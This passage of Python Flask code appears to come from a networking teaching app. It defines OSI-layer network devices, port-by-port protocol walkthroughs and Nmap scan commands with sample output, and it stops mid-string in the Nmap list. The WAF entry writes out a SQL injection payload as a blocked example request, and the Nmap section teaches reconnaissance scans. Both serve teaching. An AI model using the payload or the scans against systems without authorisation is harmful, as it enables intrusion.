from flask import Flask, render_template, jsonify, abort

app = Flask(__name__)

# ==================== DEVICE DATABASE ====================
# Image URLs use Wikimedia Commons direct file links (public domain / CC licensed)
DEVICES = {
    # ============ Layer 7 Devices ============
    "gateway": {
        "name": "Gateway",
        "layers": [7, 6, 5, 4, 3, 2, 1],
        "icon": "🚪",
        "color": "#e74c3c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Adsl_router.jpg/640px-Adsl_router.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Connects two different networks using different protocols.",
        "use_case": "Your home Wi-Fi router acts as a gateway between your home network and your ISP's network. It translates between your private IP (192.168.x.x) and the public internet.",
        "how_it_works": [
            "Receives packets from one network protocol",
            "Strips the protocol headers",
            "Re-encapsulates data with the destination network's protocol",
            "Forwards to the destination network"
        ],
        "real_example": "Home router connecting your LAN to the Internet",
        "simulation_steps": [
            {"from": "PC (LAN)", "to": "Gateway", "data": "192.168.1.5 → 8.8.8.8", "action": "Request arrives"},
            {"from": "Gateway", "to": "NAT Translation", "data": "Public IP: 49.x.x.x", "action": "Converts private → public IP"},
            {"from": "Gateway", "to": "Internet", "data": "Forwarded packet", "action": "Sends to ISP"}
        ]
    },
    "firewall_l7": {
        "name": "Application Firewall (WAF)",
        "layers": [7],
        "icon": "🛡️",
        "color": "#e74c3c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Fortigate_100D.jpg/640px-Fortigate_100D.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Inspects application-layer traffic to block attacks.",
        "use_case": "Protects websites from SQL injection, XSS, and DDoS attacks by analyzing HTTP/HTTPS requests before they reach the web server.",
        "how_it_works": [
            "Receives HTTP/HTTPS request",
            "Analyzes payload for malicious patterns",
            "Checks against OWASP rules",
            "Blocks or allows based on policy"
        ],
        "real_example": "Cloudflare WAF protecting websites",
        "simulation_steps": [
            {"from": "Attacker", "to": "WAF", "data": "GET /admin?id=1' OR '1'='1", "action": "Malicious request"},
            {"from": "WAF", "to": "Analysis", "data": "SQL Injection detected", "action": "Pattern matched"},
            {"from": "WAF", "to": "Attacker", "data": "403 Forbidden", "action": "Blocked!"}
        ]
    },
    "proxy": {
        "name": "Proxy Server",
        "layers": [7],
        "icon": "🔀",
        "color": "#e74c3c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Server-rack.jpg/640px-Server-rack.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Acts as intermediary between client and server.",
        "use_case": "Corporate proxies filter employee web access and cache frequently visited sites to save bandwidth.",
        "how_it_works": [
            "Client sends request to proxy",
            "Proxy checks cache or policy",
            "Forwards request to destination server",
            "Returns response to client"
        ],
        "real_example": "Squid Proxy in enterprises",
        "simulation_steps": [
            {"from": "Client", "to": "Proxy", "data": "GET youtube.com", "action": "Request received"},
            {"from": "Proxy", "to": "Policy Check", "data": "Blocked category", "action": "Access denied"},
            {"from": "Proxy", "to": "Client", "data": "Access Denied page", "action": "Response sent"}
        ]
    },

    # ============ Layer 4 Devices ============
    "firewall_l4": {
        "name": "Stateful Firewall",
        "layers": [4, 3],
        "icon": "🔥",
        "color": "#27ae60",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Firewall.png/640px-Firewall.png",
        "image_credit": "Wikimedia Commons",
        "short": "Tracks connection state and filters by port/protocol.",
        "use_case": "Blocks incoming connections to port 22 (SSH) from the internet while allowing outgoing connections.",
        "how_it_works": [
            "Maintains connection state table",
            "Checks source/destination ports",
            "Verifies packet belongs to established connection",
            "Allows or drops based on rules"
        ],
        "real_example": "Linux iptables, pfSense firewall",
        "simulation_steps": [
            {"from": "External IP", "to": "Firewall", "data": "SYN → Port 22", "action": "Inbound SSH attempt"},
            {"from": "Firewall", "to": "Rule Engine", "data": "BLOCK port 22 inbound", "action": "Rule matched"},
            {"from": "Firewall", "to": "External IP", "data": "DROP", "action": "Packet dropped"}
        ]
    },

    # ============ Layer 3 Devices ============
    "router": {
        "name": "Router",
        "layers": [3],
        "icon": "🌐",
        "color": "#3498db",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b1/Cisco_1841_Router.jpg/640px-Cisco_1841_Router.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Routes packets between different networks using IP addresses.",
        "use_case": "Your home router connects your local network to the internet. It decides where each packet should go based on its IP address.",
        "how_it_works": [
            "Receives packet with destination IP",
            "Looks up routing table",
            "Finds best next-hop",
            "Forwards packet out correct interface"
        ],
        "real_example": "Cisco ISR, home Wi-Fi router",
        "simulation_steps": [
            {"from": "PC", "to": "Router", "data": "Packet → 8.8.8.8", "action": "Packet arrives"},
            {"from": "Router", "to": "Routing Table", "data": "Lookup 8.8.8.8", "action": "Next hop: 192.168.1.1"},
            {"from": "Router", "to": "ISP", "data": "Forwarded packet", "action": "Sent to next router"}
        ]
    },
    "l3_switch": {
        "name": "Layer 3 Switch",
        "layers": [3, 2],
        "icon": "⚙️",
        "color": "#3498db",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Cisco_Catalyst_2960_switch.jpg/640px-Cisco_Catalyst_2960_switch.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Combines routing and switching in hardware.",
        "use_case": "Enterprise networks use L3 switches to route between VLANs at wire speed.",
        "how_it_works": [
            "Maintains MAC address table AND routing table",
            "Switches within same VLAN (L2)",
            "Routes between VLANs (L3)",
            "All in hardware ASIC for speed"
        ],
        "real_example": "Cisco Catalyst 3850",
        "simulation_steps": [
            {"from": "VLAN 10 PC", "to": "L3 Switch", "data": "Frame → VLAN 20", "action": "Inter-VLAN traffic"},
            {"from": "L3 Switch", "to": "Route Decision", "data": "L3 lookup", "action": "Route to VLAN 20"},
            {"from": "L3 Switch", "to": "VLAN 20 PC", "data": "Frame delivered", "action": "Delivered"}
        ]
    },

    # ============ Layer 2 Devices ============
    "switch": {
        "name": "Network Switch",
        "layers": [2],
        "icon": "🔗",
        "color": "#9b59b6",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/24-port_switch.jpg/640px-24-port_switch.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Forwards frames to specific devices using MAC addresses.",
        "use_case": "Office switches connect 24-48 computers and forward data only to the intended device, not broadcasting to all like a hub.",
        "how_it_works": [
            "Learns MAC addresses from incoming frames",
            "Builds MAC address table",
            "Looks up destination MAC",
            "Forwards frame only to that port"
        ],
        "real_example": "Cisco Catalyst, Netgear business switch",
        "simulation_steps": [
            {"from": "PC-A (MAC: AA)", "to": "Switch", "data": "Frame → BB", "action": "Frame arrives"},
            {"from": "Switch", "to": "CAM Table", "data": "Lookup MAC BB", "action": "Found on port 3"},
            {"from": "Switch", "to": "PC-B (MAC: BB)", "data": "Frame delivered", "action": "Only port 3 gets it"}
        ]
    },
    "bridge": {
        "name": "Network Bridge",
        "layers": [2],
        "icon": "🌉",
        "color": "#9b59b6",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Ethernet_bridge.jpg/640px-Ethernet_bridge.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Connects two network segments at the data link layer.",
        "use_case": "Bridges connect wired and wireless segments, or split large networks to reduce collisions.",
        "how_it_works": [
            "Listens to both network segments",
            "Learns MAC addresses",
            "Forwards frames between segments if needed",
            "Filters traffic that stays on one segment"
        ],
        "real_example": "Wireless bridge connecting two buildings",
        "simulation_steps": [
            {"from": "Segment A", "to": "Bridge", "data": "Frame → Segment B", "action": "Frame arrives"},
            {"from": "Bridge", "to": "Decision", "data": "Destination in B", "action": "Forward needed"},
            {"from": "Bridge", "to": "Segment B", "data": "Frame forwarded", "action": "Crossed segments"}
        ]
    },
    "nic": {
        "name": "Network Interface Card (NIC)",
        "layers": [2, 1],
        "icon": "💳",
        "color": "#9b59b6",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Network_card.jpg/640px-Network_card.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Hardware that connects a computer to a network.",
        "use_case": "Every computer has a NIC — wired (Ethernet) or wireless (Wi-Fi). It has a unique MAC address burned in.",
        "how_it_works": [
            "Receives data from OS",
            "Adds MAC header (framing)",
            "Converts to electrical/radio signals",
            "Sends over physical medium"
        ],
        "real_example": "Intel Ethernet NIC, Wi-Fi adapter",
        "simulation_steps": [
            {"from": "OS", "to": "NIC", "data": "IP packet", "action": "Packet from OS"},
            {"from": "NIC", "to": "Frame Builder", "data": "+ MAC header", "action": "Framing"},
            {"from": "NIC", "to": "Cable", "data": "0101010 signals", "action": "Transmitted"}
        ]
    },
    "access_point": {
        "name": "Access Point (AP)",
        "layers": [2, 1],
        "icon": "📡",
        "color": "#9b59b6",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Wireless_access_point.jpg/640px-Wireless_access_point.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Provides wireless network access to devices.",
        "use_case": "Office APs let laptops and phones connect to the wired network over Wi-Fi.",
        "how_it_works": [
            "Broadcasts SSID (Wi-Fi name)",
            "Authenticates connecting devices",
            "Bridges wireless traffic to wired LAN",
            "Manages multiple clients"
        ],
        "real_example": "Ubiquiti UniFi AP, Cisco Aironet",
        "simulation_steps": [
            {"from": "Laptop", "to": "AP", "data": "Wi-Fi association", "action": "Client connects"},
            {"from": "AP", "to": "Auth", "data": "WPA2 handshake", "action": "Authenticated"},
            {"from": "AP", "to": "Wired LAN", "data": "Bridged frames", "action": "Traffic to network"}
        ]
    },
    "modem": {
        "name": "Modem",
        "layers": [2, 1],
        "icon": "📞",
        "color": "#9b59b6",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Cable_modem.jpg/640px-Cable_modem.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Converts digital data to signals for transmission media.",
        "use_case": "Cable/DSL modems convert your home network's digital data to signals that travel over phone/cable lines.",
        "how_it_works": [
            "Receives digital data from router",
            "Modulates into analog signals",
            "Sends over phone/cable line",
            "Demodulates incoming signals"
        ],
        "real_example": "Cable modem, DSL modem, fiber ONT",
        "simulation_steps": [
            {"from": "Router", "to": "Modem", "data": "Digital packet", "action": "Received"},
            {"from": "Modem", "to": "Modulator", "data": "Analog signal", "action": "Converted"},
            {"from": "Modem", "to": "ISP Line", "data": "RF signal on coax", "action": "Transmitted"}
        ]
    },

    # ============ Layer 1 Devices ============
    "hub": {
        "name": "Hub",
        "layers": [1],
        "icon": "🔌",
        "color": "#1abc9c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3d/4_port_netgear_ethernet_hub.jpg/640px-4_port_netgear_ethernet_hub.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Broadcasts data to all connected devices (legacy).",
        "use_case": "Old hubs are rarely used now — they broadcast every packet to every device, causing collisions and wasted bandwidth.",
        "how_it_works": [
            "Receives signal on one port",
            "Amplifies signal",
            "Repeats to ALL other ports",
            "No intelligence or filtering"
        ],
        "real_example": "Legacy Ethernet hub (obsolete)",
        "simulation_steps": [
            {"from": "PC-A", "to": "Hub", "data": "Frame → PC-B", "action": "Frame received"},
            {"from": "Hub", "to": "All Ports", "data": "Broadcast", "action": "Sent everywhere!"},
            {"from": "Hub", "to": "PC-C, D, E", "data": "Wasted bandwidth", "action": "Collisions possible"}
        ]
    },
    "repeater": {
        "name": "Repeater",
        "layers": [1],
        "icon": "🔁",
        "color": "#1abc9c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Wi-Fi_repeater.jpg/640px-Wi-Fi_repeater.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Regenerates weak signals to extend network range.",
        "use_case": "Extends Wi-Fi or Ethernet beyond normal distance limits by regenerating the signal.",
        "how_it_works": [
            "Receives weakened signal",
            "Regenerates original signal",
            "Retransmits at full strength",
            "No processing of data"
        ],
        "real_example": "Wi-Fi range extender",
        "simulation_steps": [
            {"from": "Weak Signal", "to": "Repeater", "data": "Attenuated", "action": "Signal arrives weak"},
            {"from": "Repeater", "to": "Regenerate", "data": "Amplify", "action": "Boost signal"},
            {"from": "Repeater", "to": "Destination", "data": "Strong signal", "action": "Extended reach"}
        ]
    },
    "cable": {
        "name": "Network Cable",
        "layers": [1],
        "icon": "🧵",
        "color": "#1abc9c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Cat5e_cable.jpg/640px-Cat5e_cable.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Physical medium that carries data signals.",
        "use_case": "Cat6 Ethernet cables carry data at 1-10 Gbps over 100 meters using twisted copper pairs.",
        "how_it_works": [
            "Copper pairs twisted to reduce interference",
            "Electrical signals represent bits",
            "RJ45 connectors on each end",
            "Max distance ~100m per segment"
        ],
        "real_example": "Cat6, Cat6a, Fiber optic cables",
        "simulation_steps": [
            {"from": "NIC", "to": "Cable", "data": "Electrical signal", "action": "Signal enters"},
            {"from": "Cable", "to": "Travel", "data": "100m max", "action": "Propagates"},
            {"from": "Cable", "to": "NIC", "data": "Received signal", "action": "Arrives at dest"}
        ]
    },
    "transceiver": {
        "name": "Transceiver",
        "layers": [1],
        "icon": "📶",
        "color": "#1abc9c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/SFP_transceiver.jpg/640px-SFP_transceiver.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Converts between electrical and optical signals.",
        "use_case": "SFP+ transceivers in switches convert electrical signals to fiber optic light for long-distance links.",
        "how_it_works": [
            "Receives electrical signal",
            "Converts to light pulses (laser/LED)",
            "Sends over fiber optic cable",
            "Converts incoming light back to electrical"
        ],
        "real_example": "SFP+, QSFP transceivers",
        "simulation_steps": [
            {"from": "Switch", "to": "Transceiver", "data": "Electrical", "action": "Digital signal in"},
            {"from": "Transceiver", "to": "Laser", "data": "Light pulses", "action": "Converted"},
            {"from": "Transceiver", "to": "Fiber", "data": "Optical signal", "action": "Sent over fiber"}
        ]
    },
    "antenna": {
        "name": "Antenna",
        "layers": [1],
        "icon": "📡",
        "color": "#1abc9c",
        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Cell_tower.jpg/640px-Cell_tower.jpg",
        "image_credit": "Wikimedia Commons",
        "short": "Converts electrical signals to radio waves.",
        "use_case": "Wi-Fi antennas broadcast and receive radio waves so laptops and phones can connect wirelessly.",
        "how_it_works": [
            "Receives electrical signal from radio",
            "Oscillates at radio frequency",
            "Radiates electromagnetic waves",
            "Receives incoming radio waves"
        ],
        "real_example": "Wi-Fi antenna, cell tower antenna",
        "simulation_steps": [
            {"from": "Radio", "to": "Antenna", "data": "AC signal", "action": "Signal applied"},
            {"from": "Antenna", "to": "Oscillate", "data": "2.4 GHz", "action": "Emits waves"},
            {"from": "Antenna", "to": "Space", "data": "EM radiation", "action": "Broadcasts"}
        ]
    },
}

# ==================== PORT DATABASE ====================
PORT_SIMULATIONS = {
    20: {"service": "FTP Data", "sim": [
        {"step": 1, "title": "TCP Handshake", "desc": "Client connects to server on port 21 (control)."},
        {"step": 2, "title": "Data Channel", "desc": "For file transfer, client opens port 20 connection."},
        {"step": 3, "title": "File Transfer", "desc": "Raw file bytes stream through port 20."},
        {"step": 4, "title": "Close", "desc": "Data channel closes after transfer completes."}
    ], "color": "#e74c3c"},
    21: {"service": "FTP Control", "sim": [
        {"step": 1, "title": "Connect", "desc": "Client initiates TCP connection to server port 21."},
        {"step": 2, "title": "Authentication", "desc": "USER/PASS commands sent over control channel."},
        {"step": 3, "title": "Commands", "desc": "LIST, RETR, STOR commands control file operations."},
        {"step": 4, "title": "Persistent", "desc": "Control channel stays open for entire session."}
    ], "color": "#e74c3c"},
    22: {"service": "SSH", "sim": [
        {"step": 1, "title": "TCP Connect", "desc": "Client connects to server port 22."},
        {"step": 2, "title": "Version Exchange", "desc": "Both exchange SSH protocol versions."},
        {"step": 3, "title": "Key Exchange", "desc": "Diffie-Hellman key exchange for encryption."},
        {"step": 4, "title": "Encrypted Session", "desc": "All traffic encrypted with AES."}
    ], "color": "#e74c3c"},
    23: {"service": "Telnet", "sim": [
        {"step": 1, "title": "Connect", "desc": "TCP connection to port 23 established."},
        {"step": 2, "title": "Login", "desc": "Username/password sent in PLAINTEXT."},
        {"step": 3, "title": "Command", "desc": "Commands sent unencrypted — INSECURE!"},
        {"step": 4, "title": "Warning", "desc": "Use SSH instead of Telnet!"}
    ], "color": "#c0392b"},
    25: {"service": "SMTP", "sim": [
        {"step": 1, "title": "Connect", "desc": "Mail client connects to SMTP server port 25."},
        {"step": 2, "title": "HELO", "desc": "Client sends HELO to identify itself."},
        {"step": 3, "title": "MAIL FROM", "desc": "Sender email address specified."},
        {"step": 4, "title": "RCPT TO", "desc": "Recipient email address specified."},
        {"step": 5, "title": "DATA", "desc": "Email body transmitted."},
        {"step": 6, "title": "Queued", "desc": "Server queues email for delivery."}
    ], "color": "#e74c3c"},
    53: {"service": "DNS", "sim": [
        {"step": 1, "title": "Query", "desc": "Client sends DNS query for google.com."},
        {"step": 2, "title": "Resolver", "desc": "Recursive resolver checks cache."},
        {"step": 3, "title": "Root → TLD → Auth", "desc": "Queries root, .com, and google.com servers."},
        {"step": 4, "title": "Response", "desc": "Returns IP address 142.250.x.x"}
    ], "color": "#f39c12"},
    67: {"service": "DHCP Server", "sim": [
        {"step": 1, "title": "DISCOVER", "desc": "Client broadcasts: 'I need an IP!'"},
        {"step": 2, "title": "OFFER", "desc": "DHCP server offers an available IP."},
        {"step": 3, "title": "REQUEST", "desc": "Client requests the offered IP."},
        {"step": 4, "title": "ACK", "desc": "Server confirms and assigns lease."}
    ], "color": "#f39c12"},
    68: {"service": "DHCP Client", "sim": [
        {"step": 1, "title": "Listen", "desc": "Client listens on UDP port 68."},
        {"step": 2, "title": "Receive OFFER", "desc": "Gets IP offer from server (port 67)."},
        {"step": 3, "title": "Send REQUEST", "desc": "Requests specific offered IP."},
        {"step": 4, "title": "Configured", "desc": "Applies IP, mask, gateway, DNS."}
    ], "color": "#f39c12"},
    69: {"service": "TFTP", "sim": [
        {"step": 1, "title": "RRQ/WRQ", "desc": "Client sends Read or Write Request to port 69."},
        {"step": 2, "title": "New Port", "desc": "Server picks random port for data transfer."},
        {"step": 3, "title": "Block Transfer", "desc": "512-byte blocks sent with ACK per block."},
        {"step": 4, "title": "Complete", "desc": "Final block smaller than 512 bytes ends transfer."}
    ], "color": "#f39c12"},
    80: {"service": "HTTP", "sim": [
        {"step": 1, "title": "TCP Connect", "desc": "Client connects to web server port 80."},
        {"step": 2, "title": "GET Request", "desc": "Browser sends: GET /index.html HTTP/1.1"},
        {"step": 3, "title": "Server Process", "desc": "Server reads file, prepares response."},
        {"step": 4, "title": "200 OK", "desc": "Response: HTTP/1.1 200 OK + HTML content"},
        {"step": 5, "title": "Render", "desc": "Browser renders the HTML page."}
    ], "color": "#3498db"},
    110: {"service": "POP3", "sim": [
        {"step": 1, "title": "Connect", "desc": "Mail client connects to port 110."},
        {"step": 2, "title": "USER/PASS", "desc": "Authentication credentials sent."},
        {"step": 3, "title": "LIST", "desc": "Lists available emails."},
        {"step": 4, "title": "RETR", "desc": "Retrieves email and deletes from server."}
    ], "color": "#e74c3c"},
    123: {"service": "NTP", "sim": [
        {"step": 1, "title": "Client Request", "desc": "Client sends timestamp T1 to NTP server."},
        {"step": 2, "title": "Server Receive", "desc": "Server receives at T2, sends at T3."},
        {"step": 3, "title": "Client Receive", "desc": "Client receives at T4."},
        {"step": 4, "title": "Calculate", "desc": "Offset = ((T2-T1)+(T3-T4))/2"}
    ], "color": "#f39c12"},
    143: {"service": "IMAP", "sim": [
        {"step": 1, "title": "Connect", "desc": "Client connects to IMAP server port 143."},
        {"step": 2, "title": "Login", "desc": "Credentials sent (use 993 for TLS)."},
        {"step": 3, "title": "SELECT INBOX", "desc": "Client selects mailbox to view."},
        {"step": 4, "title": "FETCH", "desc": "Downloads only headers first, then bodies."},
        {"step": 5, "title": "Sync", "desc": "Emails stay on server for multi-device sync."}
    ], "color": "#e74c3c"},
    161: {"service": "SNMP", "sim": [
        {"step": 1, "title": "Manager Query", "desc": "NMS sends GET request to device port 161."},
        {"step": 2, "title": "OID Lookup", "desc": "Agent looks up requested OID in MIB."},
        {"step": 3, "title": "Response", "desc": "Returns value (e.g., CPU usage, uptime)."},
        {"step": 4, "title": "Monitoring", "desc": "NMS graphs metrics over time."}
    ], "color": "#f39c12"},
    389: {"service": "LDAP", "sim": [
        {"step": 1, "title": "Bind", "desc": "Client authenticates to LDAP server."},
        {"step": 2, "title": "Search", "desc": "Sends search filter (e.g., uid=john)."},
        {"step": 3, "title": "Response", "desc": "Returns matching directory entries."},
        {"step": 4, "title": "Operation", "desc": "Read/Modify entries in directory."}
    ], "color": "#e74c3c"},
    443: {"service": "HTTPS", "sim": [
        {"step": 1, "title": "TCP Connect", "desc": "Client connects to port 443."},
        {"step": 2, "title": "ClientHello - (SNI=www.example.com)", "desc": "Browser sends supported ciphers."},
        {"step": 3, "title": "ServerHello + Cert", "desc": "Server sends SSL certificate."},
        {"step": 4, "title": "Key Exchange", "desc": "Both derive session key."},
        {"step": 5, "title": "Encrypted HTTP", "desc": "All data encrypted with AES."}
    ], "color": "#27ae60"},
    445: {"service": "SMB", "sim": [
        {"step": 1, "title": "TCP Connect", "desc": "Client connects to port 445."},
        {"step": 2, "title": "Negotiate", "desc": "Agree on SMB protocol version."},
        {"step": 3, "title": "Session Setup", "desc": "Authenticate user credentials."},
        {"step": 4, "title": "Tree Connect", "desc": "Connect to shared folder."},
        {"step": 5, "title": "File Access", "desc": "Read/write files on remote share."}
    ], "color": "#e74c3c"},
    514: {"service": "Syslog", "sim": [
        {"step": 1, "title": "Event", "desc": "Application generates log message."},
        {"step": 2, "title": "Send", "desc": "Device sends UDP packet to syslog server."},
        {"step": 3, "title": "Receive", "desc": "Server receives and parses message."},
        {"step": 4, "title": "Store", "desc": "Writes to centralized log file."}
    ], "color": "#f39c12"},
    587: {"service": "SMTP Submission", "sim": [
        {"step": 1, "title": "Connect", "desc": "Mail client connects to port 587."},
        {"step": 2, "title": "STARTTLS", "desc": "Upgrades to encrypted connection."},
        {"step": 3, "title": "AUTH", "desc": "Authenticates with username/password."},
        {"step": 4, "title": "Send", "desc": "Email submitted to mail server."}
    ], "color": "#e74c3c"},
    993: {"service": "IMAPS", "sim": [
        {"step": 1, "title": "TLS Handshake", "desc": "SSL/TLS negotiation on port 993."},
        {"step": 2, "title": "Certificate", "desc": "Server presents SSL certificate."},
        {"step": 3, "title": "Encrypted Login", "desc": "Credentials sent encrypted."},
        {"step": 4, "title": "Secure IMAP", "desc": "All IMAP operations encrypted."}
    ], "color": "#27ae60"},
    995: {"service": "POP3S", "sim": [
        {"step": 1, "title": "TLS Handshake", "desc": "Client connects, TLS established."},
        {"step": 2, "title": "Auth", "desc": "Encrypted username/password."},
        {"step": 3, "title": "Retrieve", "desc": "Email content transmitted encrypted."},
        {"step": 4, "title": "Delete", "desc": "Optionally deletes from server."}
    ], "color": "#27ae60"},
    1433: {"service": "MSSQL", "sim": [
        {"step": 1, "title": "Connect", "desc": "Client connects to SQL Server port 1433."},
        {"step": 2, "title": "Login", "desc": "Windows/SQL authentication."},
        {"step": 3, "title": "Query", "desc": "SQL query sent as TDS packets."},
        {"step": 4, "title": "Result", "desc": "Rows returned to client."}
    ], "color": "#e74c3c"},
    1521: {"service": "Oracle DB", "sim": [
        {"step": 1, "title": "Connect", "desc": "Client connects to Oracle listener 1521."},
        {"step": 2, "title": "Service Name", "desc": "Identifies target database."},
        {"step": 3, "title": "Auth", "desc": "Username/password authentication."},
        {"step": 4, "title": "Session", "desc": "SQL session established."}
    ], "color": "#e74c3c"},
    3306: {"service": "MySQL", "sim": [
        {"step": 1, "title": "TCP Connect", "desc": "Client connects to MySQL port 3306."},
        {"step": 2, "title": "Handshake", "desc": "Server sends version and capability flags."},
        {"step": 3, "title": "Auth", "desc": "Client sends hashed password."},
        {"step": 4, "title": "Query", "desc": "SQL statements executed."}
    ], "color": "#e74c3c"},
    3389: {"service": "RDP", "sim": [
        {"step": 1, "title": "Connect", "desc": "Client connects to port 3389."},
        {"step": 2, "title": "Security", "desc": "TLS or CredSSP negotiated."},
        {"step": 3, "title": "Auth", "desc": "User credentials verified."},
        {"step": 4, "title": "Session", "desc": "Desktop streamed to client."}
    ], "color": "#e74c3c"},
    5432: {"service": "PostgreSQL", "sim": [
        {"step": 1, "title": "TCP Connect", "desc": "Client connects to port 5432."},
        {"step": 2, "title": "Startup", "desc": "Sends startup message with parameters."},
        {"step": 3, "title": "Auth", "desc": "MD5/SCRAM authentication."},
        {"step": 4, "title": "Query", "desc": "SQL commands processed."}
    ], "color": "#e74c3c"},
    5900: {"service": "VNC", "sim": [
        {"step": 1, "title": "Connect", "desc": "Viewer connects to VNC server 5900."},
        {"step": 2, "title": "Version", "desc": "Protocol version exchange (RFB)."},
        {"step": 3, "title": "Auth", "desc": "Password authentication."},
        {"step": 4, "title": "Screen", "desc": "Framebuffer updates streamed."}
    ], "color": "#e74c3c"},
    6379: {"service": "Redis", "sim": [
        {"step": 1, "title": "Connect", "desc": "Client connects to Redis port 6379."},
        {"step": 2, "title": "Command", "desc": "RESP protocol commands sent."},
        {"step": 3, "title": "Operation", "desc": "GET/SET operations executed in-memory."},
        {"step": 4, "title": "Response", "desc": "Sub-millisecond response returned."}
    ], "color": "#e74c3c"},
    8080: {"service": "HTTP Alt", "sim": [
        {"step": 1, "title": "Proxy Connect", "desc": "Client connects to proxy port 8080."},
        {"step": 2, "title": "Request", "desc": "Full URL in GET request."},
        {"step": 3, "title": "Forward", "desc": "Proxy fetches from origin server."},
        {"step": 4, "title": "Return", "desc": "Response delivered to client."}
    ], "color": "#3498db"},
    8443: {"service": "HTTPS Alt", "sim": [
        {"step": 1, "title": "TLS", "desc": "TLS handshake on port 8443."},
        {"step": 2, "title": "Cert", "desc": "Certificate presented."},
        {"step": 3, "title": "Encrypt", "desc": "Session key established."},
        {"step": 4, "title": "Serve", "desc": "HTTPS content delivered."}
    ], "color": "#27ae60"},
    27017: {"service": "MongoDB", "sim": [
        {"step": 1, "title": "Connect", "desc": "Driver connects to MongoDB port 27017."},
        {"step": 2, "title": "Auth", "desc": "SCRAM-SHA authentication."},
        {"step": 3, "title": "Query", "desc": "BSON documents sent/received."},
        {"step": 4, "title": "Result", "desc": "Documents returned as cursor."}
    ], "color": "#e74c3c"},
}



# ==================== NMAP COMMON COMMANDS (WITH OUTPUTS) ====================
NMAP_COMMANDS = [
    # ---------- BASIC ----------
    {
        "command": "nmap 192.168.1.1",
        "description": "Basic scan — scans top 1000 TCP ports on the target",
        "category": "Basic",
        "color": "#3498db",
        "explanation": "The simplest Nmap scan. Without flags, Nmap runs a TCP SYN scan (if root) or TCP Connect scan (if user) against the 1000 most common ports.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0021s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds""",
        "scenario": "Typical home router — several ports open"
    },
    # ---------- TCP SCANS ----------
    {
        "command": "nmap -sS 192.168.1.1",
        "description": "TCP SYN scan (default, stealthy, requires root)",
        "category": "TCP Scans",
        "color": "#27ae60",
        "explanation": "Half-open scan. Sends SYN, receives SYN-ACK (open) or RST (closed), then sends RST. Never completes handshake.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0018s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:1A:2B:3C:4D:5E (Cisco Systems)

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds""",
        "scenario": "Stealthy scan — most common in practice"
    },
    {
        "command": "nmap -sT 192.168.1.1",
        "description": "TCP Connect scan (no root needed, slower)",
        "category": "TCP Scans",
        "color": "#3498db",
        "explanation": "Full 3-way handshake. Uses OS connect() syscall. Works without root but is logged by target application.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0034s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 2.87 seconds""",
        "scenario": "Use when you can't run as root"
    },
    # ---------- UDP SCANS ----------
    {
        "command": "nmap -sU 192.168.1.1",
        "description": "UDP scan (slow but discovers UDP services)",
        "category": "UDP Scans",
        "color": "#f39c12",
        "explanation": "Sends UDP packets. Open ports give no response; closed ports send ICMP unreachable. Very slow — use with -p to limit range.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0045s latency).
PORT     STATE         SERVICE
53/udp   open          domain
67/udp   open|filtered dhcps
123/udp  open          ntp
161/udp  closed        snmp

Nmap done: 1 IP address (1 host up) scanned in 45.67 seconds""",
        "scenario": "Discovery of DNS, DHCP, NTP services"
    },
    {
        "command": "nmap -sU -p 53,67,68,123,161 192.168.1.1",
        "description": "Focused UDP scan of common service ports only",
        "category": "UDP Scans",
        "color": "#f39c12",
        "explanation": "Instead of scanning all 65k UDP ports (which takes hours), scan only common service ports.",
        "output": """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 14:23 UTC
